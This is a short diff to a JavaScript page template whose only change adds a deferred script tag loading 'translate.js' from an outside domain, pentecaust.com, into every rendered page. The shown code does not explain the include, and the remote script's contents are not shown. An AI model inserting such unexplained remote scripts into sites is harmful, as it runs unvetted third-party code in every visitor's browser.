@@ -165,6 +165,7 @@ ${P.howto || ''}
 ${cards}
 </main>
 <footer>${esc(P.who)} ${admins.map((a) => '@' + esc(a)).join(', ')} · updated ${esc(builtAt.toISOString().slice(0, 16).replace('T', ' '))} UTC · <a href="${SITE}/created">see everything on MELEK →</a></footer>
+<script src="https://pentecaust.com/translate.js" defer></script>
 </body></html>`;
 }
 
